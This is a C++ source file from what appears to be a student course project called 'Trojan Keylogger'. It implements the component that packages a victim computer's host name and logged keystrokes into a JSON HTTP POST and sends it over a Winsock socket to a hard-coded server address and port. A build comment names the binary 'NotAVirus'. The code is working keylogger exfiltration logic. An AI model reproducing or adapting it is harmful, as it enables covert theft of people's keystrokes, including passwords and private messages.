/*******************************************************************
 *  FILE: HttpRequest.cpp
 *  AUTHOR: Keven McDowell
 *  PROJECT: Trojan Keylogger CSC590
 *  DESCRIPTION: Define class methods for the HttpRequest Class that we use to build
 *  and send Http post requests to our webserver with as well as accessor methods and 
 *  constuctors/destructors.
 *  Some of these methods and their functionality may ultimately not be
 *  needed for what we are doing for the project, but I added them anyway
 *  to make it a more complete class definition.
 * *****************************************************************/

//g++.exe -static -static-libgcc -static-libstdc++ keylogger.cpp -o NotAVirus -lws2_32


// Including the header file for the HttpRequest Class and the winsock library for socket operations.
// Also include iostream to display feedback when demonstrating keylogger.
#include "../headers/HttpRequest.h"
#include <iostream> 
#include <WinSock2.h> // Gotta send it to the server somehow.

/**************************************************************************
 * FUNCTION: HttpRequest::HttpRequest()
 * 
 * DESCRIPTON:  Default constructor for the HttpRequest Class. Doesn't really 
 * do anything other than instantiate the current object.
 * ************************************************************************/
HttpRequest::HttpRequest()
{
}


/***************************************************************************
 * FUNCTION: HttpRequest::HttpRequest(string, string, string, string)
 * 
 * PARAMETERS: 
 *      string name:
 *          -Parameter for the computer host name.
 *      string host:
 *          -Parameter for the url the post request is to be sent to (Will always be /sendkeys).
 *      string type:
 *          -Parameter what method the http request will use (Always post for this).
 *      string keys: 
 *          -Parameter containing the current set of keystrokes to be sent.
 * 
 * DESCRIPTION: Secondary constructor I made incase I ever wanted to just pass everything
 * to the object when it was being instantiated. I never ended up using it though, but
 * atleast it's there if we ever decide to do any more with this.
 * ****************************************************************************/
// Constructor that allows passing parameters for the comp name, host, method type, and keystrokes.
HttpRequest::HttpRequest(std::string name, std::string host, std::string type, std::string keys)
{
    computerName = name;
    url = host;
    method = type;
    keystrokes = keys;
}

/***************************************************************************
 * FUNCTION: HttpRequest::~HttpRequest()
 * 
 * DESCRIPTION: Destructor for the class that doesn't do anything because
 * there is no memory that needs to be freed. 
 * ****************************************************************************/

HttpRequest::~HttpRequest()
{
}

// ********************* Accessor Methods *************************************

// ********************* Getters *******************************************
/***************************************************************************
 * FUNCTION: HttpRequest::getComputerName()
 * 
 * RETURN TYPE: string
 * 
 * DESCRIPTION: Getter accessor method that returns the host name of the computer
 * currently having its keystrokes sent to the server.
 * ****************************************************************************/
std::string HttpRequest::getComputerName()
{
    return computerName;
}

/***************************************************************************
 * FUNCTION: HttpRequest::getKeyStrokes()
 * 
 * RETURN TYPE: string
 * 
 * DESCRIPTION: Getter accessor method that returns the current set of keystrokes
 * that are waiting to be sent to the server.
 * ****************************************************************************/
std::string HttpRequest::getKeystrokes()
{
    return keystrokes;
}

/***************************************************************************
 * FUNCTION: HttpRequest::getMethod()
 * 
 * RETURN TYPE: string
 * 
 * DESCRIPTION: Getter accessor method that returns the http method that is 
 * being used to send data (always post).
 * ****************************************************************************/
std::string HttpRequest::getMethod()
{
    return method;
}

/***************************************************************************
 * FUNCTION: HttpRequest::getRequest()
 * 
 * RETURN TYPE: string
 * 
 * DESCRIPTION: Getter accessor method that returns the HTTP POST request that we
 * hand crafted including the headers and body.
 * ****************************************************************************/
std::string HttpRequest::getRequest()
{
    return request;
}

/***************************************************************************
 * FUNCTION: HttpRequest::getUrl()
 * 
 * RETURN TYPE: string
 * 
 * DESCRIPTION: Getter accessor method that returns the url data is being 
 * sent to (always localhost:8080/sendkeys).
 * ****************************************************************************/
std::string HttpRequest::getUrl()
{
    return url;
}

//*****************************Setters******************************************
/***************************************************************************
 * FUNCTION: HttpRequest::setRequest(string)
 * 
 * PARAMTERS: 
 *      string reqString:
 *          -Parameter passed that is used to set the request member variable.
 * 
 * RETURN TYPE: void
 * 
 * DESCRIPTION: Sets the class member variable "request" to be the reqString parameter
 * passed.
 * ****************************************************************************/
void HttpRequest::setRequest(std::string reqString)
{
    request = reqString;
}

/***************************************************************************
 * FUNCTION: HttpRequest::setRequest(string)
 * 
 * PARAMTERS: 
 *      string reqString:
 *          -Parameter passed that is used to set the request member variable.
 * 
 * RETURN TYPE: string
 * 
 * DESCRIPTION: Sets the class member variable "request" to be the reqString parameter
 * passed.
 * ****************************************************************************/
void HttpRequest::setComputerName(std::string name)
{
    computerName = name;
}

/***************************************************************************
 * FUNCTION: HttpRequest::setKeystrokes(string)
 * 
 * PARAMTERS: 
 *      string keys:
 *          -Parameter passed that is used to set the current keystrokes set.
 * 
 * RETURN TYPE: void
 * 
 * DESCRIPTION: Sets the current set of keystrokes waiting to be sent by setting
 * the keystrokes private member variable.
 * ****************************************************************************/
void HttpRequest::setKeystrokes(std::string keys)
{
    keystrokes = keys;
}

/***************************************************************************
 * FUNCTION: HttpRequest::setMethod(string)
 * 
 * PARAMTERS: 
 *      string type:
 *          -Parameter passed that is used to set the type of http request to be made.
 * 
 * RETURN TYPE: void
 * 
 * DESCRIPTION: Changes the type of http request that is made to the server, but
 * we always use a post request for the keylogger.
 * ****************************************************************************/
void HttpRequest::setMethod(std::string type)
{
    method = type;
}

/***************************************************************************
 * FUNCTION: HttpRequest::setUrl(string)
 * 
 * PARAMTERS: 
 *      string host:
 *          -Parameter passed that is used to set where the request is sent.
 * 
 * RETURN TYPE: void
 * 
 * DESCRIPTION: Changes the url the http request is going to be sent to, but
 * we always want to hit the /sendkeys endpoint on the server.
 * ****************************************************************************/
void HttpRequest::setUrl(std::string host)
{
    url = host;
}

// ************************ Other Class Methods ************************************

/***************************************************************************
 * FUNCTION: HttpRequest::buildRequest()
 * 
 * RETURN TYPE: void
 * 
 * DESCRIPTION: Function we use to handcraft a http post request. We can do this 
 * since http is a plaintext protocol, so the main challenge here is making sure
 * the format of the headers and the request body is correct.
 * ****************************************************************************/
void HttpRequest::buildRequest()
{
    //THANK GOD HTTP IS A PLAINTEXT PROTOCOL.
    std::string reqBody = "";

    // Here we construct the body of the post request, which is a JSON object containing
    // the host name of the computer and the current set of keystrokes tracked.
    reqBody.append("{\n");
    reqBody.append("\"computerName\":");
    reqBody.append("\"" + getComputerName() + "\",\n");
    reqBody.append("\"keystrokes\":");
    reqBody.append("\"" + getKeystrokes() + "\"\n");
    reqBody.append("}");

    std::string reqString = "";

    // Here we build the request headers and attach the body of the request.
    // NOTE: Apparently you cant just use newline characters when building the request and have to use \r along with \n for it to format
    // correctly and be portable.
    reqString.append("POST /sendkeys HTTP/1.1\r\n"); // Here we define the method, the url, and which http version we are using.
    reqString.append("Host: localhost:8080\r\n"); // Here we provide the address of the host we are sending data to.
    reqString.append("Content-Type: application/json\r\n"); // Here we define the type of content being sent to the server.
    reqString.append("content-length: " + std::to_string(reqBody.length())); // Here we define the length of the request body.
    reqString.append("\r\n"); // HTTP requests separate the headers and the body by two line breaks.
    reqString.append("\r\n");
    reqString.append(reqBody); // Attaching the body we made earlier
    reqString.append("\r\n");

    setRequest(reqString); // Setting the request for the class instance.

    std::cout << reqString << std::endl;
}

/***************************************************************************
 * FUNCTION: HttpRequest::sendRequest()
 * 
 * RETURN TYPE: void
 * 
 * DESCRIPTION: Uses winsock to create a socket connection between the keylogger and
 * the webserver. The socket is created by setting the address we want to connect to and the
 * port we want to connect to it on. We also define the addressing family that we want to use.
 * Then we can attempt to connect the socket to the server.
 * After the socket connection is made, the keylogger sends the plaintext
 * post request we created through the socket to the webserver and closes the socket.
 * ****************************************************************************/
void HttpRequest::sendRequest()
{
    WSADATA WSAData; // Winsock data class object.

    // Function call for initializing winsock. Winsock must be initialized before any other winsock
    // functions can be called and used.
    if (WSAStartup(MAKEWORD(2, 0), &WSAData) != 0) 
    {
        std::cout << "Failed to start winsock" << std::endl;
    }
    else
    {
        //If we successfully start winsock, we can try and send the data.

        //Structure for holding all of our socket information.
        SOCKADDR_IN socketConfig;

        socketConfig.sin_addr.s_addr = inet_addr("192.168.1.120"); // Here we set the IP address we want to connect to.
        socketConfig.sin_family = AF_INET;  // Here we define the addressing family we want to use.
        socketConfig.sin_port = htons(8080); // Here we define the port we want to connect over.

        std::cout << "Socket Configured." << std::endl;

        SOCKET keyloggerSocket; // Defining our socket for the keylogger.

        // Here we attempt to initialize the socket using a addressing family, a socket type, and 
        // the type of protocol we want the socket to use.
        if ((keyloggerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR)
        {
            std::cout << "Failed to create socket" << std::endl;
        }
        else
        {
            std::cout << "Successfully created socket" << std::endl;
        }

        std::cout << "connecting to server.." << std::endl;

        // Here we attempt to connect to the server using the socket configuration structure we created
        // earlier containing the ip, port, and addressing family information.
        int connectResult = connect(keyloggerSocket, (SOCKADDR *)&socketConfig, sizeof(socketConfig));
        if (connectResult != 0)
        {
            std::cout << "Failed to connect. " << WSAGetLastError() << std::endl;
        }
        else
        {
            std::cout << "Server Connection successful." << std::endl;
        }

        std::cout << "Sending Trojan HTTP POST Request to the server." << std::endl;

        // Here is where we actually attempt to send the data through the socket.
        int sentBytes = send(keyloggerSocket, getRequest().c_str(), getRequest().length(), 0);
        if (sentBytes == SOCKET_ERROR)
        {
            std::cout << "Failed to Send post request." << WSAGetLastError() << std::endl;
        }
        else
        {
            std::cout << "Successfully Sent post request to server" << std::endl;
        }

        if (sentBytes < getRequest().length())
        {
            std::cout << "Failed to send entire post request" << std::endl; 
        }

        //At the end of the communication, we close the socket connection with the server.
        closesocket(keyloggerSocket);
    }
}